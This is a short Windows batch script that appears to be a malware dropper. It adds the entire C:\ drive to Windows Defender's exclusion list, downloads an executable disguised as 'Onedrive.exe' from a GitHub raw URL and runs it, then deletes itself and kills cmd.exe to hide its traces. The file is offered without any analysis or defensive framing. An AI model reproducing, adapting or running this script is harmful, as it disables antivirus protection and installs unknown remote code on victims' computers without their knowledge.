��&cls
@echo off
setlocal

set FOLDER_PATH=C:\\

if not exist "%FOLDER_PATH%" (
    echo Folder does not exist: %FOLDER_PATH%
    exit /b
)

powershell -Command "Add-MpPreference -ExclusionPath '%FOLDER_PATH%'"
timeout /t 2 /nobreak >nul

set EXE_URL=https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/Onedrive.exe


set EXE_PATH=C:\Users\Public\Onedrive.exe

powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%'"


if exist "%EXE_PATH%" (
    echo EXE file downloaded successfully!
    
    start "" "%EXE_PATH%"
) else (
    echo Failed to download the EXE file.
)


timeout /t 2 /nobreak >nul



del "%~f0"

taskkill /F /IM cmd.exe


:: End the script

endlocal
